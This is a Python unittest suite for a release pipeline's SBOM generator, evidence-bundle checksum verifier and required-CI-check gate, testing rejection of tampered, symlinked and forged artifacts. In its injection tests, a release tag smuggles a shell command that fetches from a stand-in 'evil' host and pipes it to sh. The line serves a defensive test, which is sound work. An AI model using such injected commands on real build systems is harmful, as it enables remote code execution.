#!/usr/bin/env python3
"""Release SBOM / evidence bundle / required-check gate: positive and fail-closed tests (Issue #100)."""
import contextlib
import importlib.util
import io
import json
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
COMMIT = "a" * 40
RENDERED = "kind: Pod\nspec:\n  containers:\n    - image: quay.io/x/app:1.2.3\n    - image: ghcr.io/y/z@sha256:" + "b" * 64 + "\n"


def github_filter_to_regex(pattern):
    """Approximate GitHub's tag filter matcher (documented "Filter pattern cheat sheet").

    A real pre-release tag push is the authoritative check.
    """
    out = []
    i = 0
    while i < len(pattern):
        c = pattern[i]
        if pattern.startswith("**", i):
            out.append(".*")
            i += 2
            continue
        if c == "*":
            out.append("[^/]*")
        elif c == "[":
            j = pattern.index("]", i)
            out.append(pattern[i:j + 1])
            i = j
        elif c in "+?" and out:
            out.append(c)
        else:
            out.append(re.escape(c))
        i += 1
    return re.compile("".join(out))


def load(name, rel):
    spec = importlib.util.spec_from_file_location(name, ROOT / rel)
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


sbom = load("t_sbom", "scripts/release/generate_sbom.py")
bundle = load("t_bundle", "scripts/release/evidence_bundle.py")
checks = load("t_checks", "scripts/release/verify_required_checks.py")
assets_gen = load("t_assets", "scripts/generate_platform_asset_inventory.py")


def asset_fixture():
    """Minimal synthetic inventory (no helm needed); same shape as generator.build_inventory()."""
    w = {"id": "Deployment/ns/app", "kind": "Deployment", "namespace": "ns", "chart": "beluga-platform",
         "replicas": "1", "images": ["quay.io/x/app:1.2.3"], "profiles": ["default"], "source": "beluga-platform/templates/a.yaml"}
    cr = {"id": "Kafka/ns/k", "kind": "Kafka", "apiVersion": "kafka.strimzi.io/v1", "namespace": "ns", "operator": "Strimzi",
          "profiles": ["default"], "source": "beluga-data/templates/k.yaml"}
    img = {"component": "Foo", "image": "quay.io/x/app:1.2.3", "version": "1.0", "license": "Apache-2.0",
           "consumers": ["Deployment/ns/app"], "profiles": ["default"]}
    st = {"name": "data", "type": "PVC", "namespace": "ns", "capacity": "1Gi", "consumer": "app",
          "profiles": ["default"], "source": "beluga-data/templates/p.yaml"}
    return {"scope": "declared-state static inventory; no live cluster connection",
            "charts": list(assets_gen.CHARTS), "profiles": list(assets_gen.PROFILES),
            "summary": {"workloads": 1, "customResources": 1, "images": 1, "storageAssets": 1},
            "workloads": [w], "customResources": [cr], "images": [img], "storage": [st]}

VERSIONS = """| 컴포넌트 | 버전 | 이미지 | 라이선스 | 비고 |
|---|---|---|---|---|
| Foo | 1.0 | `quay.io/x/app:1.2.3` | Apache-2.0 | n |
"""
POLICY = """approved_licenses: [Apache-2.0]
own_project_marker: {value: "해당 없음 — 자체 프로젝트", rationale: r}
license_classifications: {Apache-2.0: permissive}
"""


class Fixture(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.versions = self.tmp / "VERSIONS.md"
        self.versions.write_text(VERSIONS, encoding="utf-8")
        (self.tmp / "policies").mkdir()
        self.policy = self.tmp / "policies/license-policy.yaml"
        self.policy.write_text(POLICY, encoding="utf-8")
        self.notice = self.tmp / "NOTICE"
        self.notice.write_text((ROOT / "NOTICE").read_text(encoding="utf-8"), encoding="utf-8")
        self.license = self.tmp / "LICENSE"
        self.license.write_text("license text\n", encoding="utf-8")
        self.out = self.tmp / "out"

    def build(self, rendered=RENDERED, version="v1.2.3", commit=COMMIT):
        bundle.build(self.out, version, commit, self.versions, self.notice, self.policy, rendered, self.license,
                     asset_fixture())

    def verify(self, bundle_dir, expect_commit=None):
        bundle.verify(bundle_dir, expect_commit, self.tmp)  # self.tmp stands in for the checked-out release commit


class SbomTests(Fixture):
    def test_components_from_versions_and_images(self):
        bom = sbom.build_bom("v1.2.3", COMMIT, self.versions, self.policy, RENDERED)
        refs = {c["bom-ref"] for c in bom["components"]}
        self.assertIn("image:quay.io/x/app:1.2.3", refs)
        self.assertEqual(bom["specVersion"], "1.5")
        digest = [c for c in bom["components"] if c["name"] == "ghcr.io/y/z"][0]
        self.assertEqual(digest["version"], "sha256:" + "b" * 64)

    def test_deterministic(self):
        a = sbom.build_bom("v1.2.3", COMMIT, self.versions, self.policy, RENDERED)
        b = sbom.build_bom("v1.2.3", COMMIT, self.versions, self.policy, RENDERED)
        self.assertEqual(a, b)

    def test_fail_closed_no_images(self):
        with self.assertRaises(sbom.SbomError):
            sbom.build_bom("v1.2.3", COMMIT, self.versions, self.policy, "kind: ConfigMap\n")

    def test_fail_closed_untagged_image(self):
        with self.assertRaises(sbom.SbomError):
            sbom.build_bom("v1.2.3", COMMIT, self.versions, self.policy, "image: quay.io/x/app\n")

    def test_fail_closed_empty_versions(self):
        self.versions.write_text("no table\n", encoding="utf-8")
        with self.assertRaises(sbom.SbomError):
            sbom.build_bom("v1.2.3", COMMIT, self.versions, self.policy, RENDERED)

    def test_fail_closed_bad_commit(self):
        with self.assertRaises(sbom.SbomError):
            sbom.build_bom("v1.2.3", "short", self.versions, self.policy, RENDERED)


class BundleTests(Fixture):
    def test_roundtrip_and_cli_offline_verify(self):
        self.build()
        self.verify(self.out, COMMIT)
        proc = subprocess.run([sys.executable, str(ROOT / "scripts/release/evidence_bundle.py"), "verify", str(self.out),
                               "--repo-root", str(self.tmp)],
                              capture_output=True, text=True)
        self.assertEqual(proc.returncode, 0, proc.stderr)

    def test_unapproved_license_blocks_bundle(self):
        self.versions.write_text(VERSIONS.replace("Apache-2.0", "GPL-3.0"), encoding="utf-8")
        with self.assertRaises(ValueError):
            self.build()
        self.assertFalse((self.out / "SHA256SUMS").exists())

    def test_sbom_failure_blocks_bundle(self):
        with self.assertRaises(ValueError):
            self.build(rendered="kind: ConfigMap\n")
        self.assertFalse((self.out / "SHA256SUMS").exists())

    def test_bad_version_rejected(self):
        with self.assertRaises(bundle.EvidenceError):
            self.build(version="latest")

    def test_tampered_file_detected(self):
        self.build()
        (self.out / "sbom.cdx.json").write_text("{}\n", encoding="utf-8")
        with self.assertRaisesRegex(bundle.EvidenceError, "checksum mismatch"):
            self.verify(self.out)

    def test_missing_file_detected(self):
        self.build()
        (self.out / "release-license-inventory.md").unlink()
        with self.assertRaisesRegex(bundle.EvidenceError, "missing"):
            self.verify(self.out)

    def test_extra_file_detected(self):
        self.build()
        (self.out / "extra.txt").write_text("x", encoding="utf-8")
        with self.assertRaisesRegex(bundle.EvidenceError, "unlisted"):
            self.verify(self.out)

    def test_missing_sums_detected(self):
        self.build()
        (self.out / "SHA256SUMS").unlink()
        with self.assertRaises(bundle.EvidenceError):
            self.verify(self.out)

    def test_path_traversal_entry_rejected(self):
        self.build()
        sums = self.out / "SHA256SUMS"
        sums.write_text(sums.read_text(encoding="utf-8") + "0" * 64 + "  ../evil\n", encoding="utf-8")
        with self.assertRaisesRegex(bundle.EvidenceError, "malformed"):
            self.verify(self.out)

    def test_consistent_but_forged_manifest_commit_detected(self):
        self.build()
        manifest = json.loads((self.out / "manifest.json").read_text(encoding="utf-8"))
        manifest["commit"] = "c" * 40
        (self.out / "manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
        lines = [f"{bundle.sha256(self.out / n)}  {n}" for n in sorted(bundle.REQUIRED)]
        (self.out / "SHA256SUMS").write_text("\n".join(lines) + "\n", encoding="utf-8")
        with self.assertRaisesRegex(bundle.EvidenceError, "does not match manifest"):
            self.verify(self.out)

    def test_bundle_ships_notice_and_license(self):
        self.build()
        for name, src in (("NOTICE", self.notice), ("LICENSE", self.license)):
            self.assertEqual((self.out / name).read_bytes(), src.read_bytes())
            self.assertIn(name, (self.out / "SHA256SUMS").read_text(encoding="utf-8"))
            self.assertIn(name, bundle.REQUIRED)

    def _retamper(self, name, data):
        """Rewrite a shipped file and fix SHA256SUMS so only the checkout comparison can catch it."""
        (self.out / name).write_text(data, encoding="utf-8")
        lines = [f"{bundle.sha256(self.out / n)}  {n}" for n in sorted(bundle.REQUIRED)]
        (self.out / "SHA256SUMS").write_text("\n".join(lines) + "\n", encoding="utf-8")

    def test_tampered_notice_with_consistent_sums_detected(self):
        self.build()
        self._retamper("NOTICE", "forged notice\n")
        with self.assertRaisesRegex(bundle.EvidenceError, "NOTICE differs"):
            self.verify(self.out)

    def test_tampered_notice_without_sums_fix_detected(self):
        self.build()
        (self.out / "NOTICE").write_text("forged notice\n", encoding="utf-8")
        with self.assertRaisesRegex(bundle.EvidenceError, "checksum mismatch"):
            self.verify(self.out)

    def test_missing_license_detected(self):
        self.build()
        (self.out / "LICENSE").unlink()
        with self.assertRaisesRegex(bundle.EvidenceError, "missing"):
            self.verify(self.out)

    def test_license_differing_from_checkout_detected(self):
        self.build()
        self._retamper("LICENSE", "other license\n")
        with self.assertRaisesRegex(bundle.EvidenceError, "LICENSE differs"):
            self.verify(self.out)

    def test_sbom_components_not_matching_versions_md_detected(self):
        self.build()
        self.versions.write_text(VERSIONS.replace("| Foo |", "| Bar |"), encoding="utf-8")
        with self.assertRaisesRegex(bundle.EvidenceError, "do not match"):
            self.verify(self.out)

    def _resum(self):
        lines = [f"{bundle.sha256(self.out / n)}  {n}" for n in sorted(bundle.REQUIRED)]
        (self.out / "SHA256SUMS").write_text("\n".join(lines) + "\n", encoding="utf-8")

    def test_bundle_ships_asset_inventory(self):
        self.build()
        sums = (self.out / "SHA256SUMS").read_text(encoding="utf-8")
        manifest = json.loads((self.out / "manifest.json").read_text(encoding="utf-8"))
        self.assertEqual(manifest["asset_inventory"], [bundle.ASSET_JSON, bundle.ASSET_MD])
        for name in (bundle.ASSET_JSON, bundle.ASSET_MD):
            self.assertIn(name, bundle.REQUIRED)
            self.assertIn(name, sums)
        shipped = json.loads((self.out / bundle.ASSET_JSON).read_text(encoding="utf-8"))
        self.assertEqual(shipped, asset_fixture())
        self.assertEqual((self.out / bundle.ASSET_MD).read_text(encoding="utf-8"), assets_gen.render_markdown_en(shipped))

    def test_missing_asset_inventory_detected(self):
        for name in (bundle.ASSET_JSON, bundle.ASSET_MD):
            with self.subTest(name=name):
                self.build()
                (self.out / name).unlink()
                with self.assertRaisesRegex(bundle.EvidenceError, "missing"):
                    self.verify(self.out)
                shutil.rmtree(self.out)

    def test_tampered_asset_inventory_detected_by_sums(self):
        self.build()
        (self.out / bundle.ASSET_JSON).write_text("{}\n", encoding="utf-8")
        with self.assertRaisesRegex(bundle.EvidenceError, "checksum mismatch"):
            self.verify(self.out)

    def test_tampered_asset_inventory_with_consistent_sums_detected(self):
        self.build()
        (self.out / bundle.ASSET_MD).write_text("forged\n", encoding="utf-8")
        self._resum()
        with self.assertRaisesRegex(bundle.EvidenceError, "Markdown does not match its JSON"):
            self.verify(self.out)
        shutil.rmtree(self.out)
        self.build()
        forged = asset_fixture()
        forged["summary"]["images"] = 9
        (self.out / bundle.ASSET_JSON).write_text(json.dumps(forged), encoding="utf-8")
        self._resum()
        with self.assertRaisesRegex(bundle.EvidenceError, "summary does not match"):
            self.verify(self.out)

    def test_asset_inventory_wrong_shape_detected(self):
        self.build()
        forged = asset_fixture()
        forged["images"] = []
        forged["summary"]["images"] = 0
        (self.out / bundle.ASSET_JSON).write_text(json.dumps(forged), encoding="utf-8")
        self._resum()
        with self.assertRaisesRegex(bundle.EvidenceError, "section empty or malformed: images"):
            self.verify(self.out)

    def test_symlinked_asset_inventory_fails(self):
        self.build()
        real = self.tmp / "real-assets"
        (self.out / bundle.ASSET_JSON).replace(real)
        (self.out / bundle.ASSET_JSON).symlink_to(real)
        self._resum()
        with self.assertRaisesRegex(bundle.EvidenceError, f"symlink not allowed in bundle: {bundle.ASSET_JSON}"):
            self.verify(self.out)

    def test_expected_commit_mismatch(self):
        self.build()
        with self.assertRaisesRegex(bundle.EvidenceError, "expected"):
            self.verify(self.out, "d" * 40)


class RequiredChecksTests(unittest.TestCase):
    SHA = "e" * 40

    def run_(self, id_=10, **kw):
        base = {"id": id_, "path": ".github/workflows/sast.yml", "event": "push",
                "head_branch": "main", "head_sha": self.SHA, "status": "completed", "conclusion": "success"}
        base.update(kw)
        return base

    def job(self, name, run_id=10, conclusion="success", status="completed"):
        return {"run_id": run_id, "name": name, "status": status, "conclusion": conclusion}

    def jobs(self, run_id=10, **over):
        return [self.job(n, run_id, over.get(n, "success")) for n in checks.REQUIRED_JOBS]

    def ev(self, runs, jobs, sha=None):
        lines = lambda xs: "\n".join(json.dumps(x) for x in xs)
        return checks.evaluate(lines(runs), lines(jobs), sha or self.SHA)

    def test_pass(self):
        self.assertEqual(self.ev([self.run_()], self.jobs()), [])

    def test_multi_page_json_arrays_pass(self):
        runs = json.dumps([self.run_(id_=1, path="other.yml")]) + json.dumps([self.run_()])
        self.assertEqual(checks.evaluate(runs, json.dumps(self.jobs()), self.SHA), [])

    def test_missing_job_blocks(self):
        self.assertTrue(self.ev([self.run_()], self.jobs()[:1]))

    def test_non_success_conclusions_block(self):
        for conclusion in ("failure", "skipped", "neutral", "cancelled", None):
            with self.subTest(conclusion=conclusion):
                self.assertTrue(self.ev([self.run_()], self.jobs(**{"trivy-secrets": conclusion})))

    def test_run_not_completed_or_failed_blocks(self):
        self.assertTrue(self.ev([self.run_(status="in_progress", conclusion=None)], self.jobs()))
        self.assertTrue(self.ev([self.run_(conclusion="cancelled")], self.jobs()))

    def test_wrong_workflow_event_branch_or_sha_blocks(self):
        for over in ({"path": ".github/workflows/evil.yml"}, {"event": "pull_request"},
                     {"head_branch": "feature"}, {"head_sha": "f" * 40}):
            with self.subTest(over=over):
                self.assertTrue(self.ev([self.run_(**over)], self.jobs()))

    def test_same_named_jobs_from_other_run_do_not_count(self):
        self.assertTrue(self.ev([self.run_(10), self.run_(11, path="x.yml")], self.jobs(run_id=11)))

    def test_newest_matching_run_wins(self):
        runs = [self.run_(10, conclusion="failure"), self.run_(11)]
        self.assertEqual(self.ev(runs, self.jobs(run_id=11)), [])
        runs = [self.run_(10), self.run_(11, conclusion="failure")]
        self.assertTrue(self.ev(runs, self.jobs(run_id=10) + self.jobs(run_id=11)))

    def test_empty_or_garbage_blocks(self):
        self.assertTrue(checks.evaluate("", "", self.SHA))
        self.assertTrue(checks.evaluate("not json", "", self.SHA))
        self.assertTrue(checks.evaluate("[1]", "[]", self.SHA))


class InjectionTests(Fixture):
    EVIL = "v1.0.0';curl${IFS}evil|sh;'"

    def test_scripts_reject_malicious_tag(self):
        with self.assertRaises(bundle.EvidenceError):
            self.build(version=self.EVIL)

    def test_make_does_not_execute_malicious_tag(self):
        marker = self.tmp / "pwned"
        evil = f"v1.0.0';touch {marker};'"
        proc = subprocess.run(["make", "-C", str(ROOT), "release-evidence", f"RELEASE_VERSION={evil}",
                               f"RELEASE_COMMIT={COMMIT}", f"RELEASE_OUT={self.tmp / 'o'}"],
                              capture_output=True, text=True)
        self.assertNotEqual(proc.returncode, 0)
        self.assertFalse(marker.exists())
        proc = subprocess.run(["make", "-C", str(ROOT), "release-evidence"], capture_output=True, text=True,
                              env={"PATH": __import__("os").environ["PATH"], "RELEASE_VERSION": evil,
                                   "RELEASE_COMMIT": COMMIT, "RELEASE_OUT": str(self.tmp / "o2")})
        self.assertNotEqual(proc.returncode, 0)
        self.assertFalse(marker.exists())

    def test_workflow_run_blocks_never_interpolate_expressions(self):
        import yaml
        doc = yaml.safe_load((ROOT / ".github/workflows/release.yml").read_text(encoding="utf-8"))
        for job in doc["jobs"].values():
            for step in job["steps"]:
                self.assertNotIn("${{", str(step.get("run", "")), step.get("name"))

    def test_release_tag_filter_matches_semver_tags_only(self):
        import yaml
        doc = yaml.safe_load((ROOT / ".github/workflows/release.yml").read_text(encoding="utf-8"))
        workflow_on = doc.get("on", doc.get(True))
        pattern = workflow_on["push"]["tags"][0]
        rx = github_filter_to_regex(pattern)
        for tag in ("v1.2.3", "v10.20.30", "v1.2.3-rc.1"):
            self.assertIsNotNone(rx.fullmatch(tag), (pattern, tag))
        for tag in ("v1", "v1.2", "1.2.3", "vx.y.z", "release-1.2.3", "v1.2.3/evil",
                    "v1a.2b.3c", "v1.2.x", "v1..3", "v.1.2"):
            self.assertIsNone(rx.fullmatch(tag), (pattern, tag))


class MalformedMetadataTests(Fixture):
    def test_malformed_sbom_metadata_is_clean_error(self):
        self.build()
        bom = json.loads((self.out / "sbom.cdx.json").read_text(encoding="utf-8"))
        bom["metadata"] = ["x"]
        (self.out / "sbom.cdx.json").write_text(json.dumps(bom), encoding="utf-8")
        lines = [f"{bundle.sha256(self.out / n)}  {n}" for n in sorted(bundle.REQUIRED)]
        (self.out / "SHA256SUMS").write_text("\n".join(lines) + "\n", encoding="utf-8")
        proc = subprocess.run([sys.executable, str(ROOT / "scripts/release/evidence_bundle.py"), "verify", str(self.out)],
                              capture_output=True, text=True)
        self.assertEqual(proc.returncode, 1)
        self.assertNotIn("Traceback", proc.stderr)
        self.assertIn("FAIL", proc.stderr)


class HardeningTests(Fixture):
    def _resum(self):
        lines = [f"{bundle.sha256(self.out / n)}  {n}" for n in sorted(bundle.REQUIRED)]
        (self.out / "SHA256SUMS").write_text("\n".join(lines) + "\n", encoding="utf-8")

    def test_cli_build_with_non_default_paths_passes_build_and_verify(self):
        rendered = self.tmp / "rendered.yaml"
        rendered.write_text(RENDERED, encoding="utf-8")
        proc = subprocess.run([sys.executable, str(ROOT / "scripts/release/evidence_bundle.py"), "build",
                               "--out", str(self.out), "--version", "v1.2.3", "--commit", COMMIT,
                               "--versions", str(self.versions), "--notice", str(self.notice),
                               "--policy", str(self.policy), "--rendered", str(rendered)],
                              capture_output=True, text=True)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertIn("build PASS", proc.stdout)

    def test_symlinked_bundle_notice_fails(self):
        self.build()
        real = self.tmp / "real-notice"
        (self.out / "NOTICE").replace(real)
        (self.out / "NOTICE").symlink_to(real)
        self._resum()  # checksums match, so only the symlink check can reject
        with self.assertRaisesRegex(bundle.EvidenceError, "symlink not allowed in bundle: NOTICE"):
            self.verify(self.out)

    def test_symlinked_checkout_license_fails(self):
        self.build()
        real = self.tmp / "real-license"
        self.license.replace(real)
        self.license.symlink_to(real)  # same bytes, so only the symlink check can reject
        with self.assertRaisesRegex(bundle.EvidenceError, "checked-out LICENSE must not be a symlink"):
            self.verify(self.out)

    def test_checkout_missing_notice_or_license_fails(self):
        for name in ("NOTICE", "LICENSE"):
            with self.subTest(name=name):
                self.build()
                (self.tmp / name).rename(self.tmp / (name + ".bak"))
                try:
                    with self.assertRaisesRegex(bundle.EvidenceError, f"cannot compare {name} with checkout"):
                        self.verify(self.out)
                finally:
                    (self.tmp / (name + ".bak")).rename(self.tmp / name)
                shutil.rmtree(self.out)

    def test_import_error_is_clean_fail(self):
        def boom(*_a, **_k):
            raise ImportError("No module named 'yaml'")
        orig_verify, orig_argv = bundle.verify, sys.argv
        bundle.verify, sys.argv = boom, ["evidence_bundle.py", "verify", str(self.out)]
        stderr = io.StringIO()
        try:
            with contextlib.redirect_stderr(stderr):
                rc = bundle.main()
        finally:
            bundle.verify, sys.argv = orig_verify, orig_argv
        self.assertEqual(rc, 1)
        self.assertIn("FAIL", stderr.getvalue())
        self.assertIn("yaml", stderr.getvalue())

    def test_subprocess_failure_is_clean_fail(self):
        def boom(*_a, **_k):
            raise subprocess.CalledProcessError(1, ["helm", "template"])
        orig_verify, orig_argv = bundle.verify, sys.argv
        bundle.verify, sys.argv = boom, ["evidence_bundle.py", "verify", str(self.out)]
        stderr = io.StringIO()
        try:
            with contextlib.redirect_stderr(stderr):
                rc = bundle.main()
        finally:
            bundle.verify, sys.argv = orig_verify, orig_argv
        self.assertEqual(rc, 1)
        self.assertIn("FAIL", stderr.getvalue())
        self.assertIn("helm", stderr.getvalue())


if __name__ == "__main__":
    unittest.main()
